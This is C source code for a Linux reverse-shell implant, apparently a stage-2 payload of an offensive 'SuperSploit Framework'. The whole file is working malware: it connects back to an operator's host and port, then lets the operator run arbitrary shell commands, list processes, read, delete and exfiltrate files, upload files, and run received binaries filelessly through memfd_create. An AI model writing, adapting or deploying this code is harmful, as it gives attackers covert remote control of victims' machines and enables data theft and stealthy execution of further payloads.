#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>

#if defined(__linux__)
#include <sys/syscall.h>
#include <sys/mman.h>
#endif

/**
 * Linux-specific syscall definitions for memfd_create.
 * Syscall numbers vary by architecture.
 */
#ifndef SYS_memfd_create
#if defined(__x86_64__)
#define SYS_memfd_create 319
#elif defined(__i386__)
#define SYS_memfd_create 356
#elif defined(__arm__)
#define SYS_memfd_create 385
#elif defined(__aarch64__)
#define SYS_mem64_create 279
#define SYS_memfd_create 279
#elif defined(__apple_build_version__)
/* Placeholder for macOS compilation to prevent framework crashes */
#define SYS_memfd_create -1
#endif
#endif

#define BUFFER_SIZE 4096

/**
 * SuperSploit Framework - Native C Stage 2 (DRS)
 * Mirrors the logic of DRS.py for high-performance, fileless execution.
 */

void send_output(int sock, const char *data) {
    if (data == NULL || strlen(data) == 0) {
        send(sock, " \n", 2, 0);
    } else {
        send(sock, data, strlen(data), 0);
    }
}

void list_procs(int sock) {
    DIR *dir;
    struct dirent *ent;
    char path[512];
    char comm[256];
    char buffer[BUFFER_SIZE];
    char result[BUFFER_SIZE * 4] = "PID\tNAME\n";

    if ((dir = opendir("/proc")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_name[0] >= '0' && ent->d_name[0] <= '9') {
                snprintf(path, sizeof(path), "/proc/%s/comm", ent->d_name);
                int fd = open(path, O_RDONLY);
                if (fd != -1) {
                    int n = read(fd, comm, sizeof(comm) - 1);
                    if (n > 0) {
                        comm[n] = '\0';
                        // Remove trailing newline from comm
                        char *nl = strchr(comm, '\n');
                        if (nl) *nl = '\0';
                        
                        snprintf(buffer, sizeof(buffer), "%s\t%s\n", ent->d_name, comm);
                        strncat(result, buffer, sizeof(result) - strlen(result) - 1);
                    }
                    close(fd);
                }
            }
        }
        closedir(dir);
        send_output(sock, result);
    } else {
        send(sock, "[-] Failed to open /proc\n", 25, 0);
    }
}

void download_file(int sock, char *filename) {
    struct stat st;
    if (stat(filename, &st) != 0) {
        send(sock, "ERROR: File not found.\n", 23, 0);
        return;
    }

    FILE *f = fopen(filename, "rb");
    if (!f) {
        send(sock, "ERROR: Permission denied.\n", 26, 0);
        return;
    }

    uint32_t size = htonl((uint32_t)st.st_size);
    send(sock, &size, 4, 0);

    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, f)) > 0) {
        send(sock, buffer, bytes_read, 0);
    }
    fclose(f);
}

void upload_file(int sock, char *filename, uint32_t file_size) {
    send(sock, "READY\n", 6, 0);
    
    FILE *f = fopen(filename, "wb");
    if (!f) return;

    char buffer[BUFFER_SIZE];
    uint32_t total_received = 0;
    while (total_received < file_size) {
        int n = recv(sock, buffer, BUFFER_SIZE, 0);
        if (n <= 0) break;
        fwrite(buffer, 1, n, f);
        total_received += n;
    }
    fclose(f);
    send(sock, "Upload complete.\n", 17, 0);
}

void session_loop(int sock) {
    char buffer[BUFFER_SIZE];
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int n = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (n <= 0) break;
        
        char *cmd = strtok(buffer, "\n\r");
        if (!cmd) continue;

        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
            break;
        } else if (strncmp(cmd, "cd ", 3) == 0) {
            if (chdir(cmd + 3) == 0) send(sock, "\n", 1, 0);
            else send(sock, "[-] Directory not found\n", 24, 0);
        } else if (strcmp(cmd, "pwd") == 0) {
            char cwd[BUFFER_SIZE];
            if (getcwd(cwd, sizeof(cwd)) != NULL) {
                strcat(cwd, "\n");
                send(sock, cwd, strlen(cwd), 0);
            }
        } else if (strncmp(cmd, "ls", 2) == 0) {
            char *path = (strlen(cmd) > 3) ? cmd + 3 : ".";
            DIR *d = opendir(path);
            if (d) {
                struct dirent *dir;
                char list[BUFFER_SIZE] = "";
                while ((dir = readdir(d)) != NULL) {
                    strncat(list, dir->d_name, sizeof(list) - strlen(list) - 1);
                    strncat(list, "\n", sizeof(list) - strlen(list) - 1);
                }
                closedir(d);
                send_output(sock, list);
            } else {
                send(sock, "[-] Path error\n", 15, 0);
            }
        } else if (strncmp(cmd, "cat ", 4) == 0) {
            FILE *f = fopen(cmd + 4, "r");
            if (f) {
                char line[BUFFER_SIZE];
                while (fgets(line, sizeof(line), f)) send(sock, line, strlen(line), 0);
                fclose(f);
            } else {
                send(sock, "[-] File error\n", 15, 0);
            }
        } else if (strncmp(cmd, "rm ", 3) == 0) {
            if (unlink(cmd + 3) == 0) send(sock, "File removed.\n", 14, 0);
            else send(sock, "[-] Delete failed\n", 18, 0);
        } else if (strcmp(cmd, "ps") == 0) {
            list_procs(sock);
        } else if (strncmp(cmd, "download ", 9) == 0) {
            download_file(sock, cmd + 9);
        } else if (strncmp(cmd, "load ", 5) == 0) {
            // Staged loading for native binaries
            uint32_t size = (uint32_t)atoi(cmd + 5);
            send(sock, "READY\n", 6, 0);
            
            unsigned char *load_buf = malloc(size);
            uint32_t total = 0;
            while (total < size) {
                int n = recv(sock, load_buf + total, size - total, 0);
                if (n <= 0) break;
                total += n;
            }

            // memfd_create and execute (Fileless Execution)
            int mfd = -1;
            if (SYS_memfd_create != -1) {
                mfd = syscall(SYS_memfd_create, "staged_bin", 1);
            }

            if (mfd != -1) {
                write(mfd, load_buf, size);
                if (fork() == 0) {
                    char *av[] = {"staged_bin", NULL};
                    char fd_path[64];
                    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);
                    execve(fd_path, av, NULL);
                    exit(0);
                }
                close(mfd);
                send(sock, "[*] Native binary staged and executed.\n", 39, 0);
            } else {
                send(sock, "[-] memfd_create failed\n", 24, 0);
            }
            free(load_buf);
        } else if (strncmp(cmd, "upload ", 7) == 0) {
            char *fname = strtok(cmd + 7, " ");
            char *size_str = strtok(NULL, " ");
            if (fname && size_str) {
                upload_file(sock, fname, (uint32_t)atoi(size_str));
            }
        } else {
            // Fallback to shell execution
            FILE *pipe = popen(cmd, "r");
            if (pipe) {
                char out_buf[BUFFER_SIZE];
                int found = 0;
                while (fgets(out_buf, sizeof(out_buf), pipe)) {
                    send(sock, out_buf, strlen(out_buf), 0);
                    found = 1;
                }
                if (!found) send(sock, " \n", 2, 0);
                pclose(pipe);
            }
        }
    }
}

/**
 * Entry point: This main can be used for standalone reverse shells,
 * or the session_loop can be called from a memfd injection stub.
 */
int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <LHOST> <LPORT>\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(argv[1]);
    server.sin_port = htons(atoi(argv[2]));

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    session_loop(sock);
    close(sock);
    return 0;
}

/*
#!#!#!
name: Native C Stage 2 (DRS)
description: High-performance native reverse shell with /proc process enumeration and file transfer capabilities.
category: Stage2
author: Donald Ford
keywords: ["c2", "shell", "native", "linux"]
#!#!#!
*/